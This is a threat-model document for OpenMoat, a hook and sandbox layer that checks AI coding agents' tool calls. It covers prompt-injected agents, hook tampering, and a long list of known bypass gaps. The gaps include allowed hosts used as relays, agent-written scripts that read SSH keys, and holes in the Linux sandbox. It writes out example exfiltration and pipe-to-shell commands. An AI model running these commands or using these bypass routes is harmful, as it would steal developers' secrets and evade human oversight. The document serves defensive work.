# Threat model

[README](../README.md) · [Docs index](README.md) · [openmoat.dev/docs](https://openmoat.dev/docs/)

> [!NOTE]
> **Read this when** you need to know what OpenMoat defends, how the hook and the OS layers answer each threat class, and where it stops.

**On this page:** [1. Assets](#1-assets) · [2. Attacker](#2-attacker) · [3. Threat classes](#3-threat-classes) · [4. Out of scope](#4-out-of-scope) · [5. Known limitations](#5-known-limitations) · [6. How the claims are tested](#6-how-the-claims-are-tested)

What OpenMoat defends, against whom, how well the current code does it, and where it
does not. The hook decides each tool call it sees; the operating system enforces the
policy only inside the host sandboxes and `openmoat run` ([SANDBOX.md](SANDBOX.md)), with the
limits in §5. Per-threat test counts are in [COVERAGE.md](COVERAGE.md), generated from the
conformance fixtures.

## 1. Assets

| # | Asset |
|---|---|
| A1 | Secrets on the machine: SSH keys, cloud credentials, tokens in the environment and in `.env` files, keychains |
| A2 | Source code and git history |
| A3 | Supply-chain position: publishing packages, pushing to CI, editing workflows |
| A4 | The developer's identity and reach: GitHub, cloud consoles |
| A5 | The kernel itself: policy, lock, hook configuration, the `openmoat` binary, the audit log |

## 2. Attacker

The attacker controls any text the agent reads: files, READMEs, issue titles, pull
request bodies, web pages, MCP tool descriptions and results, dependencies. The
attacker can publish packages and MCP servers. The attacker does not have root or
the user's shell on the machine. The model is treated as untrusted: its tool calls
are requests, and a hallucinated destructive command is handled the same way as an
injected one.

Trust zones:

| Zone | Trust |
|---|---|
| `openmoat` binary and the policy, after the lock check | trusted |
| The host (agent process and its hook plumbing) | semi-trusted: assumed to call the hook honestly, may be fail-open |
| The model's tool calls | untrusted |
| Commands, MCP servers, project scripts | untrusted |
| A repository policy (`<project>/.moat/policy.yaml`) | untrusted: it may add deny and ask rules; its allow rules apply only to the exact file a person trusted with `openmoat trust` (ADR-022) |
| Policy and hook files | integrity-checked on every call |

## 3. Threat classes

"Hook" is what the default policy decides today. "OS layer" is what the host
sandboxes and `openmoat run` add today, or the planned answer from the
[roadmap](ROADMAP.md) where it says *planned*; §5 lists the gaps.

| # | Class | Hook | OS layer |
|---|---|---|---|
| T1 | Secret exfiltration via shell (`curl -d @~/.ssh/id_rsa …`) | `secrets-paths` denies reads and writes of secret paths, also through `cd`, relative operands, glob operands, `~name`, symlinks and nested shells; unlisted hosts are denied by `default.net`; a known kind of token or a brokered secret's placeholder sent to a host that is not its own is denied by `token-egress` and `placeholder-egress`, allowed hosts included; a read of a folder that holds denied paths (`cp -r ~/.codex x`, `grep -r . ~/.gemini`, `tar czf a.tgz ~/.docker`) asks (`protected-contents`, ADR-038), since the classifier sees one read of the folder and the deny names files inside it | No reads of secret paths, network only through a proxy to allowed hosts |
| T2 | Secret exfiltration via file tools (`Read ~/.aws/credentials`) | The same path rules for Claude Code `Read`/`Glob`/`Grep`/`LSP`, Cursor `beforeReadFile` and `preToolUse` `Read`/`Grep`/`Glob`, Gemini CLI `read_file`/`read_many_files`/`glob`/`grep_search`/`list_directory`, and MCP path arguments | Only under `openmoat run`: Claude Code's and Cursor's file tools run outside their sandboxes |
| T3 | Secret exfiltration via the environment (`echo $OPENAI_API_KEY`, `env`) | `env-secrets` denies reads of secret-shaped names; `env-dump` denies argument-less `env`, `printenv`, `set`, `export`, `declare`, `typeset`, and inline interpreter code that reads the whole environment (an alias such as `e = os.environ` is not followed, §5) | *Planned:* a scrubbed environment |
| T4 | Destructive git and filesystem operations | `destructive` denies force pushes in every spelling, remote branch deletion, `reset --hard`, `clean -fdx`, `branch -D`, `stash drop/clear`, `rm -rf` of `/` and `~`, `sudo`, `mkfs`, `dd if=`; a recursive `rm` that may reach the project root or beyond and discarding checkouts are not allowed, so they defer to the agent's own prompt (ADR-025) | Writes outside the project and the temp directory never reach the disk: refused on macOS, made in an in-memory home that is discarded on Linux ([SANDBOX.md](SANDBOX.md)); inside the project only the hook decides |
| T5 | Supply-chain execution (`curl … \| sh`, unknown installs, typo-squats, made-up package names, fresh malicious versions) | `pipe-to-shell` denies downloads and decoded streams piped into a shell or interpreter, and `eval`; an install of a name one typo or a common trick away from a popular package asks (`package-near-miss`, ADR-030), other installs are left to the agent's own prompt (ADR-025), and the OS sandbox confines install scripts | Network only to allowed hosts (the registries); inside `openmoat run`, npm and uv install no version published in the last 7 days (`sandbox.package_min_release_age_days`) |
| T6 | Environment poisoning (`PATH`, `LD_PRELOAD`, planted binaries) | `env-poison` denies setting dangerous variables; executable pins deny a program that resolves somewhere else than recorded (ADR-008); `git --git-dir=…` and git config that runs a program (`git -c`, `git config`) ask (`git-internals`), setting `GIT_CONFIG_*` is denied (`env-poison`), and under `openmoat run`, Claude Code and Codex git opens a bare repository only when named (`safe.bareRepository=explicit`); writing a shell's startup files (bash, zsh, fish, csh, ksh, their login files and drop-in folders) is denied (`shell-rc`), and writing into a folder on `PATH` (`~/.local/bin`, `~/bin`, `~/.cargo/bin`, `/usr/local/bin`, `/opt/homebrew/bin`, a shim named after `git`) or what every Python start runs (a site directory's `.pth`, `sitecustomize.py`, `usercustomize.py`) asks (`persistence`, `runs-later`) | Writes outside the project (shell startup files) never reach the disk, as for T4; in-project `.git/hooks` and `.envrc` refused except the gaps in [EVIDENCE.md](EVIDENCE.md); *planned:* a kernel-controlled environment |
| T7 | Obfuscation and nested execution (`bash -c`, `eval`, `$( … )`, here-documents, decoders) | Recursive classification to depth 4; decoder pipelines are canonicalised; anything unclear is `unparseable`, never `allow` (it defers under the default policy and asks under an `ask` catch-all, ADR-025), while the parts around it are still decided, so a deny among them stands; a line not read in full or past a classifier limit asks, so padding cannot turn a deny into a defer | The sandbox bounds what any spelling can reach |
| T8 | MCP tool poisoning, over-privileged MCP tools | `mcp` rules on tool names; path and URL arguments become `fs.*` and `net` atoms; unreadable arguments deny; arguments nested deeper than 8 levels are `unparseable` (deferred under the default policy); the lock pins each server definition the agents read (user and project files), and a changed or new server's tool calls are denied (`mcp-server-changed`) until a person runs `openmoat mcp accept` (ADR-026) | Opt-in: `openmoat mcp proxy` pins each tool's title, description, input and output schemas, annotations (`readOnlyHint`, `destructiveHint`) and every other field it lists, hides a changed or new tool (every tool of a server it has not seen, ADR-032) until `openmoat mcp accept`, and with `--sandbox` starts the server under `openmoat run` |
| T9 | Hook and policy tampering by the agent | `kernel-self` denies writes to state, host directories (also where `MOAT_HOME`, `CLAUDE_CONFIG_DIR`, `CODEX_HOME`, `CURSOR_CONFIG_DIR`, `GEMINI_CLI_HOME` or `HERMES_HOME` moved them), hook files (Gemini CLI's user and project `settings.json` and its `trustedFolders.json` too, Hermes Agent's `config.yaml` and `shell-hooks-allowlist.json`), and agent runs of `openmoat allow\\|doctor\\|init\\|policy\\|secret\\|trust\\|uninstall`, `openmoat sandbox sync` and `openmoat audit anchor`, and reads of the audit log, the lock, `hosts.json`, the approvals, the trust records and the MCP pins (the policy stays readable); a policy pack is installed only when its OpenSSH signature verifies against a key a person trusted, and is pinned (ADR-031); the lock denies everything after drift, except drift of only Claude Code's own display toggles and permission lists, or of Gemini CLI's model, theme, sign-in method and display keys, which is recorded and reported while the hook keeps deciding every call (§5); Claude Code `ConfigChange` blocks a drifted settings file, and a project settings file that turns hooks off or runs a program (§5); a repository policy adds only deny and ask rules unless a person trusted that exact file in that checkout, and one that does not parse or sets `defaults`, `executables` or `sandbox` denies every call in the project (ADR-022); a database shell (`sqlite3`, `duckdb`) opening the audit log is a write, so `kernel-self` denies it | Under Claude Code's and Codex's sandboxes, commands cannot change `~/.moat`, the agents' settings and hook files in the home, or those in the project root (`.claude/settings*.json`, `.cursor/hooks.json`, `.cursor/sandbox.json`, `.codex/hooks.json`, `.moat`). On Linux the same files in a project subdirectory stay writable (`claude-code.linux-write-globs`, `codex.linux-write-globs` in `openmoat sandbox show`), and Cursor's sandbox cannot deny inside the workspace (§5); the state read denies hold in Seatbelt (`openmoat run` on macOS) and the host sandboxes that take them; Landlock cannot deny inside a grant, so on Linux `openmoat run` refuses to start where a grant holds the state directory (§5) |
| T10 | Hook supply chain (a trojaned hook binary) | Hooks are exec-form with an absolute, stable path (ADR-016); `kernel-self` denies writes to any `bin/openmoat` or `bin/moat` and to the recorded binary, its other name beside it (`moat` runs the `openmoat` next to it), its directory and its link target by literal path, which the host sandboxes and Claude Code's deny rules name too; `openmoat init` refuses a binary inside a project, a temp directory or a directory the sandboxes may write; `doctor` names a missing or different hook binary | Releases carry build provenance attestations |
| T11 | Time of check vs. time of use, symlinks | Literal and resolved paths are both checked (ADR-009) | Sandbox path rules apply at use |
| T12 | Network to unknown hosts | `default.net` denies shell network to unlisted hosts, except a `curl` or `wget` that provably sends nothing, which defers like `WebFetch` (ADR-035); `cloud-metadata` denies metadata and link-local services; `local-net` defers localhost to the agent's own prompt; `openmoat proxy` refuses loopback, link-local and metadata addresses, and private and CGNAT ones the policy does not name, after DNS resolution; `WebFetch` of an unlisted host defers to the agent's own prompt (ADR-017, ADR-025); after a secret read, network and MCP calls in the same session ask (`session-taint`) | Host sandboxes allow only the policy's hosts; `openmoat run`, and host sandboxes with `sandbox.proxy_port`, go through `openmoat proxy` |
| T13 | Publishing through a push: an injected agent commits a token or a CI workflow change and pushes, so the secret is published or CI runs the change with the repository's secrets | The push check ([POLICY.md §4.2](POLICY.md#42-the-push-check)) reads the commits a `git push` or `gh pr create` would send: a known token format or a brokered secret's value in an added line or a message denies (`push-secret`); a change to a `runs-later` file in a session that read untrusted content or a secret asks (`push-runs-later`); a push it cannot check within 10 s or 8 MiB asks (`push-unchecked`) | None: the push goes to a host the policy allows |

## 4. Out of scope

- An attacker with root, or with the user's own shell outside the agent.
- A malicious `openmoat` binary from a compromised release pipeline. Releases carry build
  provenance attestations (`gh attestation verify`), which show where an artefact was
  built, not that the pipeline was sound.
- Attacks on the model provider, and agents that run in a vendor's cloud.
- Prompt-injection detection in text. OpenMoat governs actions, not intent.

## 5. Known limitations

These hold for the current code. Each is a design consequence or a tracked gap, not
something OpenMoat claims to stop.

- **MCP servers start before OpenMoat sees a call.** A host starts its MCP servers when
  a session begins, outside every sandbox. When a definition changed or was added and
  no person accepted it, OpenMoat denies that server's tool calls, but the command has
  already run once. Only `openmoat mcp proxy --sandbox` or `openmoat run` confines it. Without
  `openmoat mcp proxy`, a server can change its tool descriptions unseen. With it, every
  tool waits for a person's `openmoat mcp accept`, the first listing of a new server too
  (ADR-032), but prompts, resources, tool results and remote (HTTP) servers are not
  pinned. `mcp: { trust_first_sight: true }` in the policy brings back pinning a new
  server's first listing unseen, so a server malicious from its first start gets its
  descriptions pinned as good; `openmoat policy lint` warns while it is on. Servers the
  proxy pinned on first sight before ADR-032 keep those pins. Plugin and managed MCP
  servers are not read (ADR-026).

- **An agent's own process is not checked.** A flaw inside the agent itself runs where
  no hook sees it: OpenCode 1.0.137 to 1.18.32 on Windows and WSL ran a command from a
  remote MCP server's OAuth sign-in address as it connected (Pillar Security, fixed in
  1.18.33), and the advisories of every supported agent are of this kind. OpenMoat asks
  before the agent runs its own CLI to save an MCP server or start an MCP sign-in
  (`runs-later`), holds a new server's tools until a person accepts them, and
  `openmoat status` and `openmoat doctor` warn, in one line per agent, when the version
  on the search path has a published advisory with a fixed version (the list is in each
  agent's spec, `advisories.rs`, and is only as current as the OpenMoat release). A
  server the person adds is trusted by them, and the sign-in itself runs unchecked.

- **Package checks are offline and name-based (ADR-030).** `package-near-miss` compares
  each installed name with a bundled list of popular names per registry, written by
  hand and refreshed with `scripts/refresh-top-packages.py`; nothing asks a registry.
  So: a squat on a name that is not on the list, or one more than one edit away
  (`reqests2`, another GitHub owner of the same Go repository), is not asked about; a
  real but less popular package close to a listed one asks once; the list goes stale
  between releases; names of four letters or fewer are never compared; a package the
  agent made up that resembles nothing is a normal unknown name and defers; and
  what a package does (install scripts, maintainer changes, a compromised popular
  package) is not looked at. Installs from a lockfile or a requirements file
  (`npm ci`, `npm install`, `pip install -r`) and dependencies pulled in by a package
  are not checked; nor are `npx`, `uvx`, `pnpm dlx` and `bunx`, which download and run
  a package. The release age `openmoat run` asks for (`sandbox.package_min_release_age_days`)
  reaches only npm (`npm_config_before`) and uv (`UV_EXCLUDE_NEWER`), not pip, pnpm,
  Yarn or Bun, nothing outside `openmoat run`, and not uv in a project with a `uv.lock`;
  it delays a malicious version rather than detecting it, and a program that resets
  the variables escapes it.

- **Outside the sandboxes, the hook decides alone.** `openmoat run` (below) is the one
  place OpenMoat applies a sandbox itself. In the Standard tier (ADR-018), `openmoat init`
  configures the agent's own sandbox from the policy, so commands Claude Code runs
  through `Bash`, `PowerShell` and `Monitor`, every command Codex runs, and the
  terminal commands Cursor runs in its sandbox are confined by the operating system:
  no reads of `secrets-paths`, no reads outside the project and `sandbox.read_roots`,
  no writes outside the project (and the temp directory) that reach the disk (on
  Linux they land in an in-memory home that is discarded), and no network except
  allowlisted domains. A classifier mistake inside those bounds is
  still a bypass, and in scope as a vulnerability ([SECURITY.md](../SECURITY.md)).
  OpenClaw, GitHub Copilot CLI, pi, Gemini CLI, OpenCode and Hermes Agent get no such sandbox: the
  hook alone decides each of their calls. For them, and for Claude Code and Cursor on
  native Windows or wherever their sandbox is not in place, running a file the same
  session wrote asks (`session-written-code`, below).
  The Maven and Gradle settings `build-credentials` names are denied by the hook only
  (ADR-034): where a policy makes them readable to sandboxed commands (a read root or
  allow rule over `~/.m2` or `~/.gradle`), any program such a command runs can read
  them, not only `mvn` and `gradle`. The same holds for `agent-credentials`, the
  files where each agent keeps its login, provider keys and OAuth tokens: the hook
  denies the agent's own tools reading or writing them (a shell command naming them,
  a file tool, an MCP argument), but a sandbox leaves them readable, since the agent
  reads its own login there; a program a sandboxed command runs, or a script that
  builds the path at run time, can still read them. A recursive read of the folder
  that holds them (`cp -r ~/.codex x`, `tar czf a.tgz ~/.hermes`) is one read of the
  folder; the hook asks for it (`protected-contents`, ADR-038), and a host that
  cannot ask denies it, but once a person approves it the copy holds the files.
- **What the Standard tier does not cover.** It is as strong as each host's sandbox
  and OpenMoat's translation, and every host version bump must keep the generated keys
  working (`openmoat doctor` names a weakened setting; the differential suite executes
  them, [EVIDENCE.md](EVIDENCE.md)). Cursor's `sandbox.json` cannot deny a path
  inside the workspace, so the policy's denies there (`.env`, `.moat`, `.git` apart
  from the hooks and config Cursor protects itself) do not bind its sandboxed
  commands, and Cursor runs some commands outside its sandbox (below and
  [SANDBOX.md](SANDBOX.md#cursors-sandbox)). On Linux, Claude Code's sandbox denies a
  project script the `.env` files that exist under the session's working directory when
  the command starts (#359); one created later, or one in another readable directory
  (`/add-dir`, a read root, a path outside the user directories), stays readable;
  for the audit log, whose `-wal` and `-shm` files come and go, the whole state
  directory is denied there instead. Claude Code's `denyWrite` cannot name a
  directory without its contents, so another agent's directory (`.cursor`, `.codex`,
  `.copilot`, `.gemini`) in a subdirectory, and on Linux any of them, can be moved
  away by a sandboxed command and replaced by one holding its own hook file; on
  macOS the working directory's and the home's are kept in place, and the hook
  denies the agent's own `mv`, `rename` or `rm` of one.
  It also drops every glob among the write denies (#372): only `.env`, `.envrc` and
  `.moat` directly in the working directory, and that directory's own `.git` hooks and
  config, are kept from sandboxed writes there; a `.env` or `.moat` in a subdirectory,
  `.env.local`, `.git/info/attributes`, submodule hooks and a project's `bin/moat` stay
  writable. Codex on Linux hides a `**/` deny's matches only after listing every directory below
  it, and runs no command when one is unreadable, so the generated profile repeats the
  `.env` denies only in the project and the read roots inside the home (#358): a
  sandboxed command can read a `.env` under `/etc`, `/usr` or `/tmp` outside the
  project, and on Linux a `.env` created after the command started. It can also
  create a missing match there, except `.env` and `.envrc` directly in a workspace
  root, which the profile denies by name (#377): `.env.local`, a `.envrc` in a
  subdirectory and a project's `bin/moat` stay creatable. OpenMoat does not configure
  terminal input (`TIOCSTI`) in the host sandboxes; what EVIDENCE.md shows is the hosts'
  own behaviour: Claude Code starts its commands without a terminal, Codex's macOS
  profile refuses `TIOCSTI`, and Codex's Linux sandbox does not, so only a kernel with
  `dev.tty.legacy_tiocsti` at 0 (`EIO`, as on CI's runner) stops a sandboxed script
  there from typing a command into the terminal for the user's shell; `openmoat doctor` warns on Linux with Codex set up when that setting allows it, or when the kernel (before 6.2) has none. Claude Code's file tools, `WebFetch`, MCP servers and hooks run
  outside its sandbox; only the hook governs them. Writes by a sandboxed command to
  the session's working directory are allowed even when the session started above
  the git root, and Claude Code leaves paths outside the user directories (`/Users`,
  `/home`, `/Volumes`, …) readable. `sandbox.read_roots` (toolchains, `/usr`, temp)
  are readable by sandboxed commands while the hook defers or asks for them. Egress goes
  to allowlisted domains through the hosts' proxies, which check the requested host
  name, so any allowlisted host stays a relay. `openmoat sandbox show` lists every loss
  and allowance; ADR-018 lists the open risks.
- **Translation losses (stricter than the policy).** Neither host can re-allow
  `.env.example`, `.env.sample`, `.env.template`, `.env.dist`, `.env.*.example`,
  `.env.*.sample` or `.env.*.template` inside the `**/.env.*` deny, so
  sandboxed commands cannot read them; Claude Code's file tools refuse them too, by the
  deny rules `openmoat init` writes on every OS so that they hold when the hook does not run. Codex keeps `.git` read-only for sandboxed
  commands and asks to run `git commit` outside. Claude Code's file tools refuse reads outside the
  working directories (`permissions.blockReadsOutsideWorkingDirectories`) where the
  hook would defer or ask.
- **Claude Code's sandbox writes `.git`.** So that `git commit` works, sandboxed
  commands may write any `.git` except `hooks`, `config`, `config.worktree`,
  `info/attributes`, a linked worktree's `commondir` and the same in submodules
  (ADR-021, #203); renaming `.git` or `.git/hooks` is refused too. On Linux only the
  working directory's own repository is covered, by Claude Code itself, without
  `info/attributes` and submodules (#372). A script can still
  rewrite refs and objects (history tampering, which `git log`, signatures and review
  can show), write a rebase todo that a person later continues, or write a `.git`
  *file* (`gitdir: …`) below the project. The hook asks for any write to a `.git`
  file or directory in the project, nested ones included, and for `git --git-dir=…`;
  `openmoat run` on macOS keeps a nested `.git` unwritable too. Git does not open a
  directory that merely looks like a bare repository under `openmoat run`, Claude Code or
  Codex (`safe.bareRepository=explicit`, git 2.38 or later; Cursor has no setting for it).
- **The Lightweight tier (`openmoat run`) is weaker per command than the Standard tier.**
  It confines the agent process and everything it starts in one sandbox
  ([ARCHITECTURE.md](ARCHITECTURE.md) §14). What the agent needs, every script it runs
  gets too:
  - its executable and `--write` state directory;
  - its API host through the proxy;
  - credentials in its environment (`ANTHROPIC_API_KEY`).

  The keychain is never granted, so a project script cannot read the agent's OAuth
  token from it. The agent's own sandbox must be off inside, because sandboxes do not
  nest, so there is no per-command boundary below OpenMoat's. Unlike the Standard tier,
  the agent's in-process tools (file tools, `WebFetch`, the MCP servers it starts) are
  inside the sandbox too.

  Other limits:
  - Network is the proxy alone: a tool that ignores `HTTP(S)_PROXY` has none, and
    any allowlisted host stays a relay.
  - On macOS it uses `sandbox-exec`, which Apple has deprecated (Codex, Claude Code
    and Chromium still use it). It needs macOS 13 or later: the generated profile
    names `(ioctl-command TIOCSTI)`, an identifier `sandbox-exec` only recognises
    from macOS 13 onwards. On macOS 12 and earlier `openmoat run` refuses without
    starting the agent (fail closed); where it cannot read the macOS version it
    tries, and `sandbox-exec` refuses the profile itself. CI covers `macos-14` and
    `macos-15-intel`; GitHub Actions no longer offers a `macos-13` runner, so
    macOS 13 is not exercised (#389).
  - The profile leaves every file's existence, size and times visible.
  - On Linux, Landlock only grants. Secrets inside a granted tree stay readable and
    writable for the agent's commands: `.env` in the project, `~/.cargo/credentials.toml`
    in a read root, the project's `.git`; `.envrc` and `.moat` can be created. The hook still denies them for the agent's
    tool calls. `openmoat run --isolate` closes this where bubblewrap runs (below).
    Without a network namespace, a `--write` path that holds what `kernel-self`
    protects (`--write ~/.claude` holds `settings.json`) refuses to start, since
    nothing could keep those paths from commands.
  - An agent's own configuration in the project (`.claude/hooks/`, `.mcp.json`,
    `.cursor/mcp.json`, `.codex/config.toml`, `.github/hooks/`, `.github/mcp.json`,
    `.openclaw/extensions/`, `.pi/…`, OpenCode's `opencode.json[c]` and `.opencode/…`)
    is unwritable for commands on macOS, a write
    the person allowed included; on Linux only the files existing directly in the
    project are, where the agent gets a network namespace, and the rest stays
    writable inside the project, which Landlock grants whole. The folders holding them
    directly in the project (`.github`, `.pi`, `.openclaw`, `.opencode`) cannot be renamed away and

    back on either (on macOS not created or removed either); a nested one, such as a
    package's `.github` in `node_modules`, can. On Linux, an agent's hook settings
    existing directly in the project (`.claude/settings.json` and the like) are
    read-only in the network namespace too. CI files and commit-hook managers' files
    stay writable on both (installs write them); the hook asks before the agent's tools
    write one. On Linux an agent configuration file missing when the run starts
    (`.mcp.json`, `.claude/hooks/`) can still be created by a command.
  - Also on Linux, Landlock restricts TCP by port only. Where bubblewrap can run,
    `openmoat run` gives the agent a network namespace with only loopback, where the
    proxy's port is relayed in, so connections reach only the proxy. Where it is
    missing or cannot create user namespaces, the proxy's port is reachable on any
    host, around the proxy's host checks, secrets broker, taint and audit; `openmoat run`
    says so on every start and `openmoat doctor` warns.
  - On Linux a seccomp filter allows only IPv4 and IPv6 TCP sockets, so the user's
    D-Bus session bus, other Unix sockets, UDP, raw, netlink and packet sockets are
    closed (`EPERM`), and `io_uring`, which could create sockets around the filter, is
    refused. A send with `MSG_FASTOPEN` (TCP Fast Open, which connects inside
    `sendto()` without the `connect()` Landlock's port rule checks) is refused too.
    So are `ptrace` and `process_vm_readv`/`writev`: a command cannot read
    the agent's memory, and debuggers do not work. So are the kernel keyrings
    (`keyctl`, `add_key`, `request_key`) and new namespaces (`unshare`, `clone` with a
    namespace flag; `clone3` answers `ENOSYS`) and joining an existing one (`setns`),
    so a command cannot read the person's session keys, make a user namespace in which
    to mount over what the sandbox hides, or enter another container's; containers and Chromium's own sandbox do not start inside. Names resolve
    only through the proxy: a tool that ignores `HTTP(S)_PROXY` cannot resolve them.
    `socketpair()` stays allowed; its sockets reach only each other.
  - The agent shares the user's terminal. Typing into it is refused: `TIOCSTI` on
    macOS (Seatbelt), `TIOCSTI` and `TIOCLINUX` on Linux (the seccomp filter, also
    inside `--isolate`), whatever the kernel's `dev.tty.legacy_tiocsti` says.
    Otherwise a script could leave a command in the terminal's input that the
    user's shell runs after the session, outside the sandbox (CVE-2017-5226). Of the
    terminals only `/dev/tty` and the one `openmoat run` was started on can be opened,
    so a command cannot read or write the person's other terminals; a program that
    opens a pseudo-terminal of its own inside can fail. Output is not filtered: escape sequences a command prints reach the terminal emulator.
    OpenMoat's own text output (`openmoat show`, `openmoat status`, `openmoat policy check`, the
    guard's deny line) shows control characters in agent text as `?`.

  `openmoat run` prints each allowance before the agent starts. What it stops in an allowed
  project script, per operating system, and the gaps above, are executed in CI and
  listed in [EVIDENCE.md](EVIDENCE.md).
- **The Isolated tier (`openmoat run --isolate`) is Linux only so far.** bubblewrap gives
  the agent a root with only the project, the read roots, the `--write` paths and an
  empty temp directory, and a network namespace whose only exit is OpenMoat's proxy,
  with the Lightweight tier's Landlock rules and seccomp filter inside
  ([SANDBOX.md](SANDBOX.md#openmoat-run---isolate-isolated-tier-linux)). It hides what the
  policy denies inside those trees only where it exists when the session starts (and
  `.env`, `.envrc` and `.moat` directly in the project even when missing): a match a
  command creates later stays open to the agent's commands. The agent and its scripts
  still share one sandbox, so everything the agent needs (its state, its API host,
  the credentials in its environment) its scripts get too. It depends on bubblewrap and
  on the kernel's user namespaces, which have their own CVE history. On macOS it
  refuses until it has a virtual machine (#175).
- **Project scripts run arbitrary code.** `npm test`, `npm run *`, `cargo test`,
  `cargo run`, `make`, `make test`, `pytest`, `python -m venv` and similar are allowed
  by `dev-shell`. They run whatever the project's scripts, build files and test files
  say, and OpenMoat sees only the command line. `source .venv/bin/activate` runs the
  project's activate script in the agent's shell, and the `PATH` it sets makes later
  commands in that shell run programs from the project's `.venv/bin`. An agent that can write into the project can therefore run
  any code through an allowed command. In the Standard tier that code runs inside the
  host's sandbox, and under `openmoat run` inside OpenMoat's, with the bounds above. Under
  Cursor the code runs in Cursor's sandbox as the `sandbox.json` OpenMoat generates
  sets it (macOS and Linux), which cannot deny a path inside the workspace (`.env`,
  `.git` stay open to it), and with the user's permissions when Cursor runs the
  command outside it: after its Auto-review classifier approves it, in Run Everything
  mode, in Allowlist mode with sandboxing off, in the Cursor CLI without `--sandbox
  enabled`, and on native Windows. The Cursor CLI can also run under `openmoat run`
  (SANDBOX.md).
- **Allowed hosts are relays.** `registries` allows network to `api.github.com`,
  `github.com` and the package registries. The host check passes for any command
  that reaches them, so a command that is itself allowed (a project script) or that
  the agent's own prompt lets through (`curl -X POST https://api.github.com/gists -d
  @file` is decided on its `shell` atom only, which the default policy defers) can send data there. A `WebFetch` GET, and a
  `curl` or `wget` that sends nothing (ADR-035), can carry data in its URL; the prompt
  shows the URL. A `curl` or `wget` that follows redirects (`curl -L`, `wget` without
  `--max-redirect=0`) stays `net`, since a redirect leads where the hook cannot see, and
  so does one that may read its own configuration files (`curl` without `-q` first,
  `wget` without `--no-config --no-netrc`), which can add a body or an upload; writing
  those files is denied (`shell-rc`). Session taint (POLICY.md §4.1)
  narrows this. After a secret read, `net`, `fetch` and MCP calls in the same session
  ask. After a `fetch` or an MCP result, writes to CI, git hooks, the build and
  test definitions of every ecosystem the default policy runs (`package.json`,
  `CMakeLists.txt`, `pom.xml`, `build.gradle`, `*.csproj`, `Rakefile`, `conftest.py`,
  `.cargo/config.toml`, …; POLICY.md §4.1) and agent instruction files ask, and so
  do writes to the paths a policy adds under `taint.protected_writes`.
- **Token shapes are checked where the guard sees them, and only the known ones.**
  `token-egress` denies a GitHub, OpenAI/Anthropic, AWS, Slack, Google, npm or GitLab
  token going to a host that is not its service's, allowed relays included (POLICY.md
  §6). It sees URLs, web search queries, MCP URL arguments and the arguments of a
  command that connects to a host and of commands piped into it. It does not see a token
  in a file the command uploads (`curl -d @file`), a here-document, a variable whose
  value is not in the command line, a config file (`.curlrc`), a proxy variable that
  redirects the request, an encoded or split token, MCP arguments other than URLs, or a
  token of any other format: no entropy guessing, so tokens without a vendor prefix
  (and generic `Authorization: Bearer` values) pass. A token sent to its own service is
  not checked, whatever account it belongs to; a self-hosted GitLab or GitHub Enterprise
  server is not the service's host, so a token sent there is denied.
- **Session taint is minimal.** It follows host tool calls only. `openmoat run`'s proxy
  applies it to the run's connections (ADR-027): after a hook-visible call of a linked
  agent session read secret material, a request to any host but that secret's own is
  refused, and a connection opened before the read is closed within about a second
  (the proxy checks each open connection's session again every second). A hook inside `openmoat run` gets its decision from the `openmoat run` process
  (ADR-028), which writes the links. Connections through the standalone `openmoat proxy` (the host
  sandboxes' `sandbox.proxy_port`) carry no session, and taint does not apply to them.
  It does not count these as untrusted content: shell network to
  allowed hosts (`gh pr view`, `git pull`), an allowed command that reads secrets at run
  time (a project script), or a command OpenMoat cannot classify. A secret that leaves
  through an allowed command without a `net` atom (`npm test`) is not seen. With the
  default policy, `secrets-paths` denies, so only the secrets broker (#172) or a policy
  that asks for secret reads can taint a session. An edited or deleted audit event
  clears taint until `openmoat doctor` reports the broken chain.
- **Taint follows written files only partly.** An injected session can write a payload
  to a script or a config that another session (or a person's later session) reads or
  runs. File provenance (ADR-029, POLICY.md §4.1.1) records each file a tainted
  session writes by a literal path and taints a later session that reads or runs it,
  so that session's protected writes ask. A file is tracked by its path, not its
  content: a copy or a rename is followed only when the command shows the source as a
  read in the same call (the session is then tainted and the destination recorded), and
  not at all when a clean session's command does it out of sight. Content produced
  indirectly (a script or a build that writes another file, a download a command saves)
  and files read through a directory search (`Grep`, `Glob`) are not tracked. An `Edit`, a shell write and an `apply_patch` carry no hash, so such a file
  taints every later reader until a clean session rewrites it with `Write`; a `Write`'s
  hash stops matching when anything changes the file, a change no session made
  included, and then the file no longer taints. Provenance rows are outside the hash
  chain: they sit in the same OpenMoat-only database, append-only by trigger, but an
  edit with write access to `~/.moat` is not reported by `openmoat doctor`.
- **Code the session wrote is checked only as far as the hook sees it (ADR-039).** An
  agent that writes a script and runs it (`python3 x.py`) hides from the hook what the
  script opens: it can build the path of `~/.ssh/id_rsa` and send the key to an allowed
  host. Where an OS sandbox from OpenMoat holds the command (Claude Code, Codex and
  Cursor on macOS and Linux with their sandbox in place, anything inside `openmoat
  run`) the sandbox stops that read, and the call keeps its verdict. Elsewhere, running
  a file the same host session wrote asks (POLICY.md §4.3), and so does inline code
  (`python3 -c`, `node -e`, a here-document) that opens files, connects, reads the
  environment or runs programs through text it builds at run time (`opaque-code`).
  Not covered: test runners, build tools and package scripts running files the session
  wrote (`pytest`, `npm test`, `cargo test`, `make`, `go run .`), which run the
  project's code by design; files another session or a person wrote; files written by a
  program whose writes OpenMoat cannot see: the member files of an archive (`tar x`,
  `unzip`: the destination folder is a write, the files in it are not listed), a build
  tool's or a package manager's output, what a script the agent wrote writes in turn, a
  download saved under a name the command does not show, a copy made inside a script;
  inline code that writes only through a name it builds (that is `opaque-code`, which
  asks itself); a program the command names through a variable whose value the
  line does not show; code that a program loads on its own (`import helper` of a
  written `helper.py`, `require('./lib')`, a `conftest.py`, a git hook); commands in a
  shell OpenMoat does not parse (PowerShell, `cmd`), which defer to the agent; and
  inline code whose built text the scan does not recognise as built (an API or a
  builder not on its lists). The hosts' sandbox state is read from their settings as
  `openmoat status` reads it, so a flag that turns a sandbox off when the agent starts
  (Codex's `--sandbox danger-full-access`) is not seen. The record of what each session
  wrote keeps 30 days and the newest 100 000 files; a file whose row is gone counts as
  one the session did not write.
- **A proxy credential is shared by everything in its session.** `openmoat run`'s proxy
  serves only requests that carry the run's credential (ADR-027), which keeps other
  local programs and other runs off it. The credential sits in the agent's environment,
  so every command in the run's sandbox has it; they all are the session. A process of
  the same user outside the sandbox that can read the agent's environment (`ps eww` on
  some systems, `/proc/<pid>/environ` on Linux) can use the session too. The standalone
  `openmoat proxy` asks for no credential, so any local process may use it.
